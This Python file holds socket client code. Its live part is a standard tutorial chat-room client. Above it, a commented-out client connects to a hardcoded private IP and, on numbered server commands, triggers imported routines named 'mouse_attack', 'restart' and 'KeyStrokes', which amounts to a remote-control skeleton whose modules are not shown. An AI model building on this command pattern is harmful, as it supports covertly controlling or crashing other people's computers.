# import socket
# import MouseControl , KeyStrokes , Restart

# def start_client():
#     # Create a socket object
#     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
#     # Define server IP address and port
#     host = '172.20.10.7'
#     port = 12310
    
#     # Connect to the server
#     client_socket.connect((host, port))
    
#     while True:
        
#         # Send a message to the server
#         client_message = input("Client: ")
#         client_socket.send(client_message.encode('utf-8'))
        
#         if client_message.lower() == 'exit':
#             print("Closing connection")
#             break
        
#         # Receive response from the server
#         server_message = client_socket.recv(1024).decode('utf-8')
#         if server_message.lower() == 'exit':
#             print("Server closed the connection")
#             break
        
#         if server_message == '1':
#             MouseControl.mouse_attack()
        
#         if server_message == '2':
#             Restart.restart()
        
#         if server_message == '3':
#             KeyStrokes.KeyStrokes()
        
#         else:
#             pass
#         print(f"Server: {server_message}")

#     # Close the client socket
#     client_socket.close()

# if __name__ == "__main__":
#     start_client()

# # import socket
# # ClientMultiSocket = socket.socket()
# # host = '10.159.134.117'
# # port = 6000
# # print('Waiting for connection response')
# # try:
# #     ClientMultiSocket.connect((host, port))
# # except socket.error as e:
# #     print(str(e))
# # res = ClientMultiSocket.recv(1024)
# # while True:
# #     Input = input('Hey there: ')
# #     ClientMultiSocket.send(str.encode(Input))
# #     res = ClientMultiSocket.recv(1024)
# #     print(res.decode('utf-8'))
# # ClientMultiSocket.close()

# Python program to implement client side of chat room. 
import socket 
import select 
import sys 

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
if len(sys.argv) != 3: 
	print ("Correct usage: script, IP address, port number")
	exit() 
IP_address = str(sys.argv[1]) 
Port = int(sys.argv[2]) 
server.connect((IP_address, Port)) 

while True: 

	# maintains a list of possible input streams 
	sockets_list = [sys.stdin, server] 

	""" There are two possible input situations. Either the 
	user wants to give manual input to send to other people, 
	or the server is sending a message to be printed on the 
	screen. Select returns from sockets_list, the stream that 
	is reader for input. So for example, if the server wants 
	to send a message, then the if condition will hold true 
	below.If the user wants to send a message, the else 
	condition will evaluate as true"""
	read_sockets,write_socket, error_socket = select.select(sockets_list,[],[]) 

	for socks in read_sockets: 
		if socks == server: 
			message = socks.recv(2048) 
			print (message) 
		else: 
			message = sys.stdin.readline() 
			server.send(message) 
			sys.stdout.write("<You>") 
			sys.stdout.write(message) 
			sys.stdout.flush() 
server.close() 
